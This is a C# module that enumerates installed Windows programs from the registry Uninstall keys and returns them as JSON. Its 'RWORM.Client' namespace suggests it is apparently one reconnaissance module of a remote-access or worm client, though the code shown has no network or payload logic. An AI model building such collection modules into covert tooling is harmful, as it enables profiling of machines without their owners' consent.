using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class InstalledPrograms
    {
        public static byte[] GetInstalledPrograms()
        {
            var sb = new StringBuilder("[");
            bool first = true;
            var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            void ScanKey(RegistryKey? root, string subKey)
            {
                if (root == null) return;
                try
                {
                    using var key = root.OpenSubKey(subKey);
                    if (key == null) return;

                    foreach (var subName in key.GetSubKeyNames())
                    {
                        try
                        {
                            using var appKey = key.OpenSubKey(subName);
                            if (appKey == null) continue;

                            // System component check
                            var isSystem = appKey.GetValue("SystemComponent");
                            if (isSystem is int sysInt && sysInt == 1) continue;

                            // ParentKeyName check (updates)
                            var parentKey = appKey.GetValue("ParentKeyName")?.ToString();
                            if (!string.IsNullOrEmpty(parentKey)) continue;

                            var displayName = appKey.GetValue("DisplayName")?.ToString();
                            if (string.IsNullOrWhiteSpace(displayName)) continue;

                            displayName = displayName.Trim();
                            if (!seen.Add(displayName)) continue;

                            var version = appKey.GetValue("DisplayVersion")?.ToString() ?? "";
                            var publisher = appKey.GetValue("Publisher")?.ToString() ?? "";
                            var installDate = appKey.GetValue("InstallDate")?.ToString() ?? "";
                            var installLocation = appKey.GetValue("InstallLocation")?.ToString() ?? "";
                            var uninstallString = appKey.GetValue("UninstallString")?.ToString() ?? "";

                            string n = JsonHelper.Escape(displayName);
                            string v = JsonHelper.Escape(version);
                            string p = JsonHelper.Escape(publisher);
                            string d = JsonHelper.Escape(installDate);
                            string loc = JsonHelper.Escape(installLocation);
                            string u = JsonHelper.Escape(uninstallString);

                            if (!first) sb.Append(',');
                            first = false;
                            sb.Append($"{{\"name\":\"{n}\",\"version\":\"{v}\",\"publisher\":\"{p}\",\"installDate\":\"{d}\",\"installLocation\":\"{loc}\",\"uninstallString\":\"{u}\"}}");
                        }
                        catch { }
                    }
                }
                catch { }
            }

            // 64-bit and 32-bit uninstall keys in HKLM and HKCU
            try
            {
                using var hklm64 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                ScanKey(hklm64, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");

                using var hklm32 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
                ScanKey(hklm32, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");

                using var hkcu = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default);
                ScanKey(hkcu, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
            }
            catch { }

            sb.Append(']');
            return Encoding.UTF8.GetBytes(sb.ToString());
        }
    }
}
